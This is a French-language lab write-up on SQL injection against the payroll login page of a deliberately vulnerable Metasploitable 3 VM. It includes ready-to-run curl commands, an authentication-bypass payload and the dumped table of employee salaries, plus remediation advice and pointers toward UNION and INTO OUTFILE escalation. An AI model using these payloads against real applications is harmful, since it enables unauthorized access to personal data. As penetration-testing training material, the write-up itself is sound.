# Write-up — Payroll App : injection SQL (Metasploitable 3, port 80)

Cible : `172.28.128.3/payroll_app.php` · Pas de CVE — appli maison, faille de code
applicative. Résultat : **bypass d'authentification + dump complet de la table payroll** (15
employés).

Tout ce qui suit est copier-coller direct (testé en zsh), côté 🖥 Kali uniquement.

---

## 1. Recon

Repérée dans le listing du webroot (voir `drupal.md`, même scan). Appli minimaliste :
```bash
curl -s http://172.28.128.3/payroll_app.php
```
Un simple formulaire de login (`user` + `password`, POST sur elle-même). En-têtes HTTP :
```bash
curl -sI http://172.28.128.3/payroll_app.php
```
```
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.4.5
```
PHP 5.4.5 — ancien, cohérent avec une appli jamais mise à jour depuis la construction de la
VM.

## 2. Identifier la vulnérabilité

Pas de CVE à chercher : c'est une appli maison, pas un produit connu. Hypothèse la plus
simple à tester sur un formulaire de login : **identifiants faibles**, puis **injection
SQL**.

```bash
curl -s -X POST http://172.28.128.3/payroll_app.php -d "user=admin&password=admin&s=OK"
```
```
<h2>Welcome, admin</h2><table>...</table>
```
`admin:admin` est accepté (login réussi), mais la table retournée est **vide** — le compte
existe mais n'a pas de données associées, ou la requête de listing est distincte de la
requête de login.

Test d'injection SQL classique sur les deux champs :
```bash
curl -s -X POST http://172.28.128.3/payroll_app.php \
  --data-urlencode "user=' OR '1'='1" \
  --data-urlencode "password=' OR '1'='1" \
  -d "s=OK"
```
→ **La table entière est retournée** (15 employés, voir §3). L'injection fonctionne.

**Mécanisme.** La requête SQL derrière le login est très probablement de la forme
`SELECT ... WHERE user='$user' AND password='$password'`, avec les valeurs POST concaténées
directement dans la requête, sans échappement ni requête préparée. En remplaçant les deux
champs par `' OR '1'='1`, la clause devient
`WHERE user='' OR '1'='1' AND password='' OR '1'='1'` — toujours vraie, donc la requête
retourne **toutes** les lignes de la table, peu importe les vraies valeurs stockées.

Confirmation que l'injection doit toucher les **deux** champs (pas juste un) :
```bash
curl -s -X POST http://172.28.128.3/payroll_app.php \
  --data-urlencode "user=' OR '1'='1" \
  -d "password=nimportequoi&s=OK"
```
→ Table vide. Logique : `AND` est prioritaire sur `OR` en SQL — injecter seulement
`user` donne `user='' OR ('1'='1' AND password='nimportequoi')`, qui reste faux tant que le
mot de passe ne correspond pas réellement. Il faut neutraliser **les deux** côtés de la
clause pour que la condition globale soit toujours vraie.

Un guillemet seul dans `user` casse la requête (page totalement vide, pas même le
"Welcome") — signe d'une erreur de syntaxe SQL non gérée côté serveur, cohérent avec une
concaténation directe sans échappement.

## 3. Preuve d'accès — dump complet de la table

```bash
curl -s -X POST http://172.28.128.3/payroll_app.php \
  --data-urlencode "user=' OR '1'='1" \
  --data-urlencode "password=' OR '1'='1" \
  -d "s=OK"
```
```
Welcome, ' OR '1'='1
Username           First Name  Last Name   Salary
leia_organa        Leia        Organa      9560
luke_skywalker     Luke        Skywalker   1080
han_solo           Han         Solo        1200
artoo_detoo        Artoo       Detoo       22222
c_three_pio        C           Threepio    3200
ben_kenobi         Ben         Kenobi      10000
darth_vader        Darth       Vader       6666
anakin_skywalker   Anakin      Skywalker   1025
jarjar_binks       Jar-Jar     Binks       2048
lando_calrissian   Lando       Calrissian  40000
boba_fett          Boba        Fett        20000
jabba_hutt         Jaba        Hutt        65000
greedo             Greedo      Rodian      50000
chewbacca          Chewbacca   —           4500
kylo_ren           Kylo        Ren         6667
```
**15 employés exfiltrés sans authentification valide**, y compris leur salaire — donnée
sensible par nature pour une appli RH.

→ **Recoupement avec Samba** (`samba-enum.md`) : le compte système `chewbacca` trouvé par
énumération SMB apparaît ici aussi comme employé — probablement le même "personnage" utilisé
comme fil conducteur du labo sur plusieurs services, pas une coïncidence technique.

## 4. Pistes non explorées

- Pas testé si l'injection permet d'aller plus loin qu'un `SELECT` (ex. `UNION SELECT` pour
  lire d'autres tables de la base, ou injection empilée pour écrire). Le formulaire ne
  renvoie que les colonnes attendues (user/prénom/nom/salaire), donc une UNION demanderait de
  deviner le bon nombre de colonnes — pas fait ici, résultat déjà suffisant pour la
  démonstration.
- Pas de tentative de RCE via cette injection (ex. `INTO OUTFILE` si MySQL et droits
  suffisants) — hors scope de cette page, piste pour plus tard si besoin d'aller jusqu'à un
  shell.

---

## Remédiation

- Utiliser des **requêtes préparées** (prepared statements) partout où une entrée utilisateur
  entre dans une requête SQL — élimine la classe entière de vulnérabilité, pas juste ce cas
  précis.
- Ne jamais construire une requête SQL par concaténation de chaînes avec des données POST
  brutes.
- Mettre à jour PHP (5.4.5 est très obsolète, hors support depuis des années) et le serveur
  SQL sous-jacent.
- Chiffrer ou masquer les données sensibles (salaires) même en cas d'accès légitime à la
  base, par défense en profondeur.

---

**Pour rejouer tout le scénario depuis zéro** : `./start.sh` (démarre la VM), puis les
commandes `curl` de l'étape 2-3 dans l'ordre. Aucune écriture côté cible, uniquement des
lectures — rien à nettoyer.

**Suite du parcours MS3 :** `chat/` et `phpmyadmin/`, les deux dernières applis du webroot à
explorer.
